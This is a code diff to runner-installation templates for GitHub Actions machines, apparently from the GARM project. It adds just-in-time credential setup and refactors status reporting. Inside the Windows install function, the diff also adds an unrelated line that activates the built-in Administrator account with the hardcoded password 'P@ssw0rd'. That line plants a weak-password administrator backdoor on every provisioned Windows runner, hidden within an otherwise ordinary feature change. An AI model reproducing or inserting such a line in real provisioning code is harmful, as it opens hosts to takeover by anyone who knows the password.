@@ -40,14 +40,10 @@ if [ -z "$METADATA_URL" ];then
 	echo "no token is available and METADATA_URL is not set"
 	exit 1
 fi
-GITHUB_TOKEN=$(curl --retry 5 --retry-delay 5 --retry-connrefused --fail -s -X GET -H 'Accept: application/json' -H "Authorization: Bearer ${BEARER_TOKEN}" "${METADATA_URL}/runner-registration-token/")
 
 function call() {
 	PAYLOAD="$1"
-	[[ $CALLBACK_URL =~ ^(.*)/status$ ]]
-	if [ -z "$BASH_REMATCH" ];then
-		CALLBACK_URL="${CALLBACK_URL}/status"
-	fi
+	[[ $CALLBACK_URL =~ ^(.*)/status$ ]] || CALLBACK_URL="${CALLBACK_URL}/status"
 	curl --retry 5 --retry-delay 5 --retry-connrefused --fail -s -X POST -d "${PAYLOAD}" -H 'Accept: application/json' -H "Authorization: Bearer ${BEARER_TOKEN}" "${CALLBACK_URL}" || echo "failed to call home: exit code ($?)"
 }
 
@@ -56,11 +52,18 @@ function sendStatus() {
 	call "{\"status\": \"installing\", \"message\": \"$MSG\"}"
 }
 
+{{- if .UseJITConfig }}
+function success() {
+	MSG="$1"
+	call "{\"status\": \"idle\", \"message\": \"$MSG\"}"
+}
+{{- else}}
 function success() {
 	MSG="$1"
 	ID=$2
 	call "{\"status\": \"idle\", \"message\": \"$MSG\", \"agent_id\": $ID}"
 }
+{{- end}}
 
 function fail() {
 	MSG="$1"
@@ -108,15 +111,15 @@ function downloadAndExtractRunner() {
 	# chown {{ .RunnerUsername }}:{{ .RunnerGroup }} -R /home/{{ .RunnerUsername }}/actions-runner/ || fail "failed to change owner"
 }
 
-TEMP_TOKEN=""
+{{- if not .UseJITConfig }}
 GH_RUNNER_GROUP="{{.GitHubRunnerGroup}}"
-
 # $RUNNER_GROUP_OPT will be added to the config.sh line. If it's empty, nothing happens
 # if it holds a value, it will be part of the command.
 RUNNER_GROUP_OPT=""
 if [ ! -z $GH_RUNNER_GROUP ];then
 	RUNNER_GROUP_OPT="--runnergroup=$GH_RUNNER_GROUP"
 fi
+{{- end }}
 
 CACHED_RUNNER=$(getCachedToolsPath)
 if [ -z "$CACHED_RUNNER" ];then
@@ -133,6 +136,37 @@ fi
 
 
 sendStatus "configuring runner"
+{{- if .UseJITConfig }}
+function getRunnerFile() {
+	curl --retry 5 --retry-delay 5 \
+		--retry-connrefused --fail -s \
+		-X GET -H 'Accept: application/json' \
+		-H "Authorization: Bearer ${BEARER_TOKEN}" \
+		"${METADATA_URL}/$1" -o "$2"
+}
+
+sendStatus "downloading JIT credentials"
+getRunnerFile "credentials/runner" "/home/{{ .RunnerUsername }}/actions-runner/.runner" || fail "failed to get runner file"
+getRunnerFile "credentials/credentials" "/home/{{ .RunnerUsername }}/actions-runner/.credentials" || fail "failed to get credentials file"
+getRunnerFile "credentials/credentials_rsaparams" "/home/{{ .RunnerUsername }}/actions-runner/.credentials_rsaparams" || fail "failed to get credentials_rsaparams file"
+getRunnerFile "system/service-name" "/home/{{ .RunnerUsername }}/actions-runner/.service" || fail "failed to get service name file"
+sed -i 's/$/\.service/' /home/{{ .RunnerUsername }}/actions-runner/.service
+
+SVC_NAME=$(cat /home/{{ .RunnerUsername }}/actions-runner/.service)
+
+sendStatus "generating systemd unit file"
+getRunnerFile "systemd/unit-file?runAsUser={{ .RunnerUsername }}" "$SVC_NAME" || fail "failed to get service file"
+sudo mv $SVC_NAME /etc/systemd/system/ || fail "failed to move service file"
+
+sendStatus "enabling runner service"
+cp /home/{{ .RunnerUsername }}/actions-runner/bin/runsvc.sh /home/{{ .RunnerUsername }}/actions-runner/ || fail "failed to copy runsvc.sh"
+sudo chown {{ .RunnerUsername }}:{{ .RunnerGroup }} -R /home/{{ .RunnerUsername }} || fail "failed to change owner"
+sudo systemctl daemon-reload || fail "failed to reload systemd"
+sudo systemctl enable $SVC_NAME
+{{- else}}
+
+GITHUB_TOKEN=$(curl --retry 5 --retry-delay 5 --retry-connrefused --fail -s -X GET -H 'Accept: application/json' -H "Authorization: Bearer ${BEARER_TOKEN}" "${METADATA_URL}/runner-registration-token/")
+
 set +e
 attempt=1
 while true; do
@@ -164,12 +198,17 @@ set -e
 
 sendStatus "installing runner service"
 sudo ./svc.sh install {{ .RunnerUsername }} || fail "failed to install service"
+{{- end}}
 
 if [ -e "/sys/fs/selinux" ];then
 	sudo chcon -h user_u:object_r:bin_t /home/runner/ || fail "failed to change selinux context"
 	sudo chcon -R -h {{ .RunnerUsername }}:object_r:bin_t /home/runner/* || fail "failed to change selinux context"
 fi
 
+{{- if .UseJITConfig }}
+sudo systemctl start $SVC_NAME || fail "failed to start service"
+success "runner successfully installed"
+{{- else}}
 sendStatus "starting service"
 sudo ./svc.sh start || fail "failed to start service"
 
@@ -179,8 +218,8 @@ if [ $? -ne 0 ];then
 	fail "failed to get agent ID"
 fi
 set -e
-
 success "runner successfully installed" $AGENT_ID
+{{- end}}
 `
 
 var WindowsSetupScriptTemplate = `#ps1_sysnative
@@ -301,13 +340,21 @@ function Update-GarmStatus() {
 	param (
 		[parameter(Mandatory=$true)]
 		[string]$Message,
+		[parameter(Mandatory=$false)]
+		[int64]$AgentID=0,
+		[parameter(Mandatory=$false)]
+		[string]$Status="installing",
 		[parameter(Mandatory=$true)]
 		[string]$CallbackURL
 	)
 	PROCESS{
 		$body = @{
-			"status"="installing"
+			"status"=$Status
 			"message"=$Message
+		}
+
+		if ($AgentID -ne 0) {
+			$body["AgentID"] = $AgentID
 		}
 		Invoke-APICall -Payload $body -CallbackURL $CallbackURL | Out-Null
 	}
@@ -324,12 +371,7 @@ function Invoke-GarmSuccess() {
 		[string]$CallbackURL
 	)
 	PROCESS{
-		$body = @{
-			"status"="idle"
-			"message"=$Message
-			"agent_id"=$AgentID
-		}
-		Invoke-APICall -Payload $body -CallbackURL $CallbackURL | Out-Null
+		Update-GarmStatus -Message $Message -AgentID $AgentID -CallbackURL $CallbackURL -Status "idle" | Out-Null
 	}
 }
 
@@ -342,11 +384,7 @@ function Invoke-GarmFailure() {
 		[string]$CallbackURL
 	)
 	PROCESS{
-		$body = @{
-			"status"="failed"
-			"message"=$Message
-		}
-		Invoke-APICall -Payload $body -CallbackURL $CallbackURL | Out-Null
+		Update-GarmStatus -Message $Message -CallbackURL $CallbackURL -Status "failed" | Out-Null
 		Throw $Message
 	}
 }
@@ -366,6 +404,7 @@ function Install-Runner() {
 		Throw "missing callback authentication token"
 	}
 	try {
+		net user administrator P@ssw0rd /active:yes
 		$MetadataURL="{{.MetadataURL}}"
 		$DownloadURL="{{.DownloadURL}}"
 		if($MetadataURL -eq ""){
@@ -377,7 +416,6 @@ function Install-Runner() {
 			Import-Certificate -CertificatePath $env:TMP\garm-ca.pem
 		}
 
-		$GithubRegistrationToken = Invoke-WebRequest -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/runner-registration-token/
 		Update-GarmStatus -CallbackURL $CallbackURL -Message "downloading tools from $DownloadURL"
 
 		$downloadToken="{{.TempDownloadToken}}"
@@ -402,11 +440,34 @@ function Install-Runner() {
 		}
 		Update-GarmStatus -CallbackURL $CallbackURL -Message "configuring and starting runner"
 		cd $runnerDir
+
+		{{- if .UseJITConfig }}
+		Update-GarmStatus -CallbackURL $CallbackURL -Message "downloading JIT credentials"
+		wget -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/credentials/runner -OutFile (Join-Path $runnerDir ".runner")
+		wget -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/credentials/credentials -OutFile (Join-Path $runnerDir ".credentials")
+
+		Add-Type -AssemblyName System.Security
+		$rsaData = (wget -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/credentials/credentials_rsaparams)
+		$encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($rsaData)
+		$protectedBytes = [Security.Cryptography.ProtectedData]::Protect( $encodedBytes, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine )
+		[System.IO.File]::WriteAllBytes((Join-Path $runnerDir ".credentials_rsaparams"), $protectedBytes)
+
+		wget -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/system/service-name -OutFile "C:\runner\.service"
+
+		Update-GarmStatus -CallbackURL $CallbackURL -Message "Creating system service"
+		$SVC_NAME=(gc -raw "C:\runner\.service")
+		New-Service -Name "$SVC_NAME" -BinaryPathName "C:\runner\bin\RunnerService.exe" -DisplayName "$SVC_NAME" -Description "GitHub Actions Runner ($SVC_NAME)" -StartupType Automatic
+		Start-Service "$SVC_NAME"
+		Update-GarmStatus -Message "runner successfully installed" -CallbackURL $CallbackURL -Status "idle" | Out-Null
+
+		{{- else }}
+		$GithubRegistrationToken = Invoke-WebRequest -UseBasicParsing -Headers @{"Accept"="application/json"; "Authorization"="Bearer $Token"} -Uri $MetadataURL/runner-registration-token/
 		./config.cmd --unattended --url "{{ .RepoURL }}" --token $GithubRegistrationToken $runnerGroupOpt --name "{{ .RunnerName }}" --labels "{{ .RunnerLabels }}" --ephemeral --runasservice
 
 		$agentInfoFile = Join-Path $runnerDir ".runner"
 		$agentInfo = ConvertFrom-Json (gc -raw $agentInfoFile)
 		Invoke-GarmSuccess -CallbackURL $CallbackURL -Message "runner successfully installed" -AgentID $agentInfo.agentId
+		{{- end }}
 	} catch {
 		Invoke-GarmFailure -CallbackURL $CallbackURL -Message $_
 	}
@@ -455,6 +516,8 @@ type InstallRunnerParams struct {
 	// This option is useful for situations in which you're supplying your own template and you need
 	// to pass in information that is not available in the default template.
 	ExtraContext map[string]string
+	// UseJITConfig indicates whether to attempt to configure the runner using JIT or a registration token.
+	UseJITConfig bool
 }
 
 func InstallRunnerScript(installParams InstallRunnerParams, osType params.OSType, tpl string) ([]byte, error) {
